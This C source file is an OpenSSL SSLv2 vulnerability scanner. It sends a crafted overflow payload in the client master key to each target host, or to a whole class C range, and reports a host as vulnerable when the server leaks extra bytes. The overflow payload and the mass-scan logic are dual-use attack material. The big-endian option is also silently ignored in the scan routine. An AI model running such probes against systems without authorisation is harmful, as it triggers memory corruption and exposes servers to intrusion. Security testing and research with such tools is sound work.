/*
 * openssl-scanner.c - openssl vulnerability scanner
 *
 * by Solar Eclipse <solareclipse@phreedom.org>
 *
 * Thanks to Core, HD Moore, Zillion, Dvorak and Black Berry for their help.
 *
 * This code or any derivative versions of it may not be posted to Bugtraq
 * or anywhere on SecurityFocus, Symantec or any affiliated site.
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>

#include "ssl2.h"

void usage(char* argv0);

#ifndef INADDR_NONE			/* Solaris is broken */
#define INADDR_NONE -1
#endif

#define MAX_HOSTS 1024

unsigned char overwrite_session_id_length_le[] =
	"AAAA"								/* int master_key_length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH];	*/
	"\x70\x00\x00\x00"					/* unsigned int session_id_length; */
;

unsigned char overwrite_session_id_length_be[] =
	"AAAA"								/* int master_key_length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH];	*/
	"\x00\x00\x00\x70"					/* unsigned int session_id_length; */
;

unsigned char* overwrite_session_id_length = overwrite_session_id_length_le;

struct {
	int debug;
	int log;
	int wait;

	FILE* log_fd;
} o;

int host_count = 0;
struct {
	uint32_t addr;
	pid_t pid;
	int pipe;
	char* buf;
} hosts[MAX_HOSTS];


void logf(char* fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	if (o.log) vfprintf(o.log_fd, fmt, args);
	vprintf(fmt, args);
	va_end(args);
}


void read_hosts(char* filename)
{
	FILE* fd;
	char buf[100];
	char ch;
	int c;

	if (strcmp(filename, "-") == 0) {
		if (o.debug > 0) printf("Reading hosts from stdin\n");
		fd = stdin;
	}
	else {
		if (o.debug > 0) printf("Reading hosts from input file %s\n", filename);
		if ((fd = fopen(filename, "r")) == 0) {
			printf("Error opening input file %s\n", filename);
			exit(1);
		}
	}

	host_count = 0;
	c = 0; ch = 0;

	while ((ch = fgetc(fd)) != EOF) {
		if (ch == '\n' || ch == ' ' || ch == '\t') {
			buf[c] = '\0';
			if (c > 0) {			/* skip blank lines */
				if ((hosts[host_count++].addr = inet_addr((const char*)&buf)) == INADDR_NONE) {
					printf("Malformed IP address: %s\n", buf);
					exit(1);
				}
				if (host_count >= MAX_HOSTS) {
					printf("Too many hosts, MAX_HOSTS=%d\n", MAX_HOSTS);
					exit(1);
				}
				c = 0;
			}
		} else {
			buf[c++] = ch;
		}
		if (c > sizeof(buf)-1) {
			printf("IP address too long\n");
			exit(1);
		}
	}

	if (fd != stdin) fclose(fd);

	if (o.debug > 0) printf("%d hosts read from file\n", host_count);
}

void init_options(int argc, char *argv[])
{
	char input_filename[250];
	char log_filename[255];
	int input_file;
	struct hostent* hp;
	int classc = 0;
	char log_mode[] = "w";

	int arg, i;
	
	o.debug = 0;
	o.log = 0;
	o.log_fd = NULL;
	o.wait = 10;

	input_file = 0;

	while ((arg = getopt(argc, argv, "abdi:o:w:C")) != EOF) {
		switch (arg) {
			case 'a' :	log_mode[0] = 'a';
						break;
			case 'b' :  overwrite_session_id_length = overwrite_session_id_length_be;
						break;
			case 'd' :	o.debug++;
						break;
			case 'i' :	input_file = 1;
						strncpy(input_filename, optarg, sizeof(input_filename));
						input_filename[sizeof(input_filename)-1] = '\0';
						break;
			case 'o' :	o.log = 1;
						strncpy(log_filename, optarg, sizeof(log_filename));
						log_filename[sizeof(log_filename)-1] = '\0';
						break;
			case 'w' :	o.wait = atoi(optarg);
						if (!o.wait) o.wait = 10;
						break;
			case 'C' :	classc = 1;
						break;
			case '?' :	usage(argv[0]);
						break;
		}
	}

	if (o.debug > 0) printf("Debug level %d\n", o.debug);

	if (!input_file) {
		if (optind >= argc) { 
			usage(argv[0]);
		}

		if (!(hp = gethostbyname(argv[optind]))) {
			printf("Unable to resolve address %s\n", argv[optind]);
			exit(1);
		}
		
		i = 0;
		while (hp->h_addr_list[i]) {
			hosts[i].addr = *(uint32_t*) hp->h_addr_list[i];
			i++;
		}
		host_count = i;

		if (classc) {
			if (host_count > 1) {
				printf("Target has multiple addresses, using the first one: %s\n",
					inet_ntoa(*(struct in_addr*)&hosts[0].addr));
			}

			for (i=0; i<0xff; i++)
				hosts[i].addr = htonl((ntohl(hosts[0].addr) & 0xffffff00) + i);

			host_count = 0xff;
		}
		else if (host_count > 1) {
			printf("Target has multiple addresses, scanning them all\n");
			for (i=0; i < host_count; i++)
				printf("%s\n", inet_ntoa(*(struct in_addr*)&hosts[i].addr));
		}

		optind++;
	}
	else {
		if (classc) {
			printf("The -C options can only be used when the target is specified on the command line\n");
			exit(1);
		}
		read_hosts((char*)&input_filename);
	}

	if (optind < argc) {
		usage(argv[0]);
	}
	
	if (o.log) {
		if ((o.log_fd = fopen(log_filename, log_mode)) == 0) {
			printf("Error opening log file %s\n", log_filename);
			exit(1);
		}
		if (o.debug > 0) printf("Logging to %s\n", log_filename);
	}
}

void alarm_handler(int signum)
{
	printf("Connection failed: Connection timed out\n");
	exit(0);
}

void scan_host(in_addr_t host)
{
	struct ssl_conn* ssl1;
	int len;
	
	signal(SIGALRM, alarm_handler);
	
	alarm(o.wait);

	ssl1 = ssl_connect_host(host, 443, 0);

	alarm(o.wait);
	
	send_client_hello(ssl1);
	get_server_hello(ssl1);
	send_client_master_key(ssl1, overwrite_session_id_length_le, sizeof(overwrite_session_id_length_le)-1);
	generate_session_keys(ssl1);
	get_server_verify(ssl1);
	send_client_finished(ssl1);
	len = get_server_finished(ssl1, NULL, 0);

	alarm(0);

	if (ssl1->err) {
		printf("%s\n", ssl1->err_buf);
		exit(1);
	}

	if (len >= 112)
		printf("Vulnerable\n");
	else
		printf("Not vulnerable\n");
}

void usage(char* argv0)
{
	printf("Usage: %s [options] <host>\n", argv0);
	printf("  -i <inputfile>     file with target hosts\n");
	printf("  -o <outputfile>    output log\n");
	printf("  -a                 append to output log (requires -o)\n");
	printf("  -b                 check for big endian servers\n");
	printf("  -C                 scan the entire class C network the host belogs to\n");
	printf("  -d                 debug mode\n");
	printf("  -w N               connection timeout in seconds\n\n");
	printf("Examples: %s -d 192.168.0.1\n", argv0);
	printf("          %s -i hosts -o my.log -w 5\n\n", argv0);

	exit(1);
}


int main(int argc, char* argv[])
{
	int i;
	int children = 0;
	pid_t pid;
	int pipefd[2];
	int died, len, found;
	char buf[1024];

	printf(": openssl-scanner : OpenSSL vulnerability scanner\n");
	printf("  by Solar Eclipse <solareclipse@phreedom.org>\n");
	printf("\n");

	init_options(argc, argv);

	if (o.debug > 0) printf("Scanning %d hosts, connection timeout is %d seconds\n", host_count, o.wait);

	printf("Opening %d connections . ", host_count);
	fflush(stdout);

	for (i=0; i < host_count; i++) {

		usleep(25000);

		pipe(pipefd);

		pid = fork();
		if (pid == -1) {
			printf("Error in fork()\n");
			exit(1);
		}

		if (pid) {		/* parent */
			hosts[i].pid = pid;
			hosts[i].pipe = pipefd[0];
			hosts[i].buf = NULL;

			close(pipefd[1]);
			children++;

			if (children % ((host_count / 10)+1) == 0) {
				printf(". ");
				fflush(stdout);
			}
			continue;
		}

		/* child */
		close(1);
		dup(pipefd[1]);
		close(pipefd[0]);
		
		scan_host(hosts[i].addr);
		exit(0);

	}

	printf("done\n");
	printf("Waiting for all connections to finish . ");
	fflush(stdout);

	while (children) {
		died = wait(NULL);

		found = 0;
		for (i=0; i < host_count; i++) {
			if (died == hosts[i].pid) {
				len = read(hosts[i].pipe, buf, sizeof(buf));
				buf[len] = '\0';

				if (strncmp(buf, "Connection failed", 17)) {
					hosts[i].buf = strdup(buf);
				}

				hosts[i].pid = 0; found = 1;
				children--;

				if (children % ((host_count / 10)+1) == 0) {
					printf(". ");
					fflush(stdout);
				}
			}
		}
		if (!found) {
			printf("pid %d died, but was not found in the hosts structure\n", died);
			exit(1);
		}
	}

	printf("done\n\n");

	for (i=0; i < host_count; i++) {
		if (hosts[i].buf)
			logf("%s: %s", inet_ntoa(*(struct in_addr*)&hosts[i].addr), hosts[i].buf);
	}

	if (o.log) fclose(o.log_fd);

	return 0;
}
